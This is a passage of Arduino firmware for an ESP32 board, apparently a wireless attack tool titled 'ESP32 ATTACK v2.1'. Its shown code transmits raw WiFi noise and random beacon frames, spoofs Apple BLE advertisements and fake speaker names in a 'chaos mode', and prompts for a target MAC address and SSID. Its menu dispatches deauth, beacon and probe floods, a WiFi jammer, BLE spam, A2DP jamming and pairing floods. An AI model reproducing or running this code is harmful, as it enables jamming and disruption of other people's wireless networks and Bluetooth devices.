            uint8_t noise[] = {0xFF, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00};
            esp_wifi_80211_tx(WIFI_IF_STA, noise, sizeof(noise), false);
            
            uint8_t beacon[64] = {0x80, 0x00};
            beacon[10] = random(0, 255);
            beacon[11] = random(0, 255);
            beacon[12] = random(0, 255);
            memcpy(&beacon[39], "CHAOS", 5);
            beacon[37] = 0x00;
            beacon[38] = 5;
            esp_wifi_80211_tx(WIFI_IF_STA, beacon, 44, false);
            
            packetCount++;
        }
        
        uint8_t apple[] = {0x01, 0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
        BLEAdvertisementData advData;
        advData.setManufacturerData(String((char*)apple, 8));
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->setAdvertisementData(advData);
        BLEDevice::startAdvertising();
        delay(50);
        BLEDevice::stopAdvertising();
        
        const char* speakers[] = {"JBL", "Sony", "Bose"};
        for (int i = 0; i < 3; i++) {
            BLEAdvertisementData spkData;
            spkData.setName(speakers[i]);
            adv->setAdvertisementData(spkData);
            BLEDevice::startAdvertising();
            delay(30);
            BLEDevice::stopAdvertising();
        }
        
        packetCount += 4;
        
        if (millis() - attackStart > 1000) {
            oledAttack("CHAOS MODE", "ALL ATTACKS");
            Serial.printf("[*] CHAOS: %lu total packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    BLEDevice::deinit(true);
    lastStatus = "Chaos mode OFF";
    oledStatus();
    currentAttack = "IDLE";
}

// ==================== SET TARGET ====================
void cmd_SetTargetMAC() {
    oledHeader("Set Target MAC");
    display.setCursor(0, 30);
    display.println(F("Enter MAC in Serial"));
    display.println(F("AA:BB:CC:DD:EE:FF"));
    display.display();
    
    Serial.println(F("\n[*] Enter target MAC (AA:BB:CC:DD:EE:FF):"));
    while (!Serial.available()) delay(10);
    
    String mac = Serial.readStringUntil('\n');
    mac.trim();
    mac.toUpperCase();
    
    if (mac.length() == 17 && mac[2] == ':') {
        targetMAC = mac;
        Serial.printf("[*] Target MAC set: %s\n", targetMAC.c_str());
        
        Serial.println(F("[*] Enter target name (optional, Enter to skip):"));
        delay(1000);
        if (Serial.available()) {
            String name = Serial.readStringUntil('\n');
            name.trim();
            if (name.length() > 0) {
                targetName = name;
                Serial.printf("[*] Target name: %s\n", targetName.c_str());
            }
        }
        lastStatus = "Target: " + targetMAC;
    } else {
        Serial.println(F("[!] Invalid MAC format"));
        lastStatus = "Invalid MAC!";
    }
    oledStatus();
}

void cmd_SetTargetSSID() {
    oledHeader("Set Target SSID");
    display.setCursor(0, 30);
    display.println(F("Enter SSID in Serial"));
    display.display();
    
    Serial.println(F("\n[*] Enter target WiFi SSID:"));
    while (!Serial.available()) delay(10);
    
    String ssid = Serial.readStringUntil('\n');
    ssid.trim();
    
    if (ssid.length() > 0) {
        targetSSID = ssid;
        Serial.printf("[*] Target SSID set: %s\n", targetSSID.c_str());
        lastStatus = "Target: " + targetSSID;
    } else {
        lastStatus = "No SSID entered";
    }
    oledStatus();
}

// ==================== HELPER ====================
void checkSerialStop() {
    if (Serial.available()) {
        char c = Serial.read();
        if (c == 'x' || c == 'X') {
            attacking = false;
        }
    }
}

// ==================== SETUP ====================
void setup() {
    Serial.begin(SERIAL_BAUD);
    pinMode(LED_PIN, OUTPUT);
    
    // Init OLED
    Wire.begin(21, 22);
    if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
        Serial.println(F("[!] OLED init failed!"));
    } else {
        Serial.println(F("[*] OLED initialized"));
    }
    
    // Boot animation
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(2);
    display.setCursor(10, 10);
    display.println(F("ESP32"));
    display.setCursor(10, 30);
    display.println(F("ATTACK"));
    display.setCursor(10, 50);
    display.println(F("v2.1"));
    display.display();
    delay(2000);
    
    for (int i = 0; i < 5; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(100);
        digitalWrite(LED_PIN, LOW);
        delay(100);
    }
    
    showMenu();
}

// ==================== LOOP ====================
void loop() {
    if (Serial.available()) {
        char c = Serial.read();
        c = toupper(c);
        
        switch (c) {
            case '1': cmd_BLEScan(); break;
            case '2': cmd_BTClassicScan(); break;
            case '3': cmd_BLEDeauth(); break;
            case '4': cmd_A2DPJam(); break;
            case '5': cmd_PairingFlood(); break;
            case '6': cmd_BLESpamApple(); break;
            case '7': cmd_BLESpamSamsung(); break;
            case '8': cmd_BLESpamAll(); break;
            case '9': cmd_BTChannelHopper(); break;
            case 'A': cmd_WiFiScan(); break;
            case 'B': cmd_WiFiDeauth(); break;
            case 'C': cmd_WiFiBeaconFlood(); break;
            case 'D': cmd_WiFiProbeFlood(); break;
            case 'E': cmd_WiFiJammer(); break;
            case 'F': cmd_DualAttack(); break;
            case 'G': cmd_ChaosMode(); break;
            case 'S': cmd_SetTargetMAC(); break;
            case 'T': cmd_SetTargetSSID(); break;
            case 'X': attacking = false; lastStatus = "Stopped"; oledStatus(); Serial.println(F("[*] All attacks stopped")); break;
            case 'M': showMenu(); break;
            case 'I': showSystemInfo(); break;
        }
    }
    
    // LED indicator
    if (attacking) {
        digitalWrite(LED_PIN, HIGH);
        delay(50);
        digitalWrite(LED_PIN, LOW);
        delay(50);
    } else {
        digitalWrite(LED_PIN, HIGH);
        delay(1000);
        digitalWrite(LED_PIN, LOW);
        delay(1000);
    }
}
